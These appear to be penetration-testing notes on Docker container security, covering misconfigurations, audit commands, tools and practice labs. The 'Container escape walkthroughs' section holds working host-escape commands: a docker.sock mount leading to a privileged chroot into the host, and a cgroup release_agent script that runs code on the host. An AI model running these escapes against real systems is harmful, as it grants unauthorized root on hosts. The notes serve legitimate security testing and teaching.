# Docker Security

Containers are not VMs. Misconfigs let attackers escape to the host or access other containers.

## Common misconfigurations

- Running containers as **root**
- Mounting `/var/run/docker.sock` into a container
- `--privileged` flag enabled
- Secrets in environment variables or Dockerfile
- Outdated base images with known CVEs

## Testing checklist

```bash
# Scan image for CVEs
trivy image myapp:latest

# Check if container is privileged (inside container)
cat /proc/self/status | grep CapEff

# Docker socket exposed?
ls -la /var/run/docker.sock
```

## Container escape walkthroughs

**1. Mounted Docker socket -> host root (most common):**

```bash
# Inside a container that has /var/run/docker.sock mounted
docker -H unix:///var/run/docker.sock run -it -v /:/host --privileged alpine chroot /host sh
# You are now root on the HOST filesystem
```

**2. Privileged container -> host via cgroups release_agent:**

```bash
# --privileged gives all capabilities; abuse the cgroup notify_on_release
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -1))
mkdir -p $d/w; echo 1 > $d/w/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > $d/release_agent
printf '#!/bin/sh\nid > /output' > /cmd; chmod +x /cmd
sh -c "echo 0 > $d/w/cgroup.procs"   # triggers /cmd on the host
```

**3. Enumerate your own capabilities / privilege:**

```bash
capsh --print                         # what caps do I have?
cat /proc/self/status | grep CapEff   # 0000003fffffffff = privileged
# Look for dangerous caps: CAP_SYS_ADMIN, CAP_SYS_PTRACE, CAP_DAC_READ_SEARCH
```

**4. Automated:** run `cdk evaluate` / `deepce.sh` inside the container to find all escape paths.

## Escape vectors summary

- Privileged container + mounted docker.sock = host root
- `CAP_SYS_ADMIN` / dangerous capabilities
- Writable host paths mounted into the container (`-v /:/host`)
- Host PID namespace (`--pid=host`) -> read other processes' memory
- CVE-specific escapes (check kernel and `runc` versions - e.g. CVE-2019-5736)

## Tools

| Tool | Use |
|------|-----|
| [Trivy](https://github.com/aquasecurity/trivy) | Image and filesystem CVE scan |
| [Docker Bench](https://github.com/docker/docker-bench-security) | Host configuration audit |
| [cdk](https://github.com/cdk-team/CDK) | Container penetration toolkit |

## Practice

- [TryHackMe - Container security rooms](https://tryhackme.com)
- [Kubernetes Goat](https://madhuakula.com/kubernetes-goat/)

## Related

- [Kubernetes Security](Kubernetes%20Security.md)
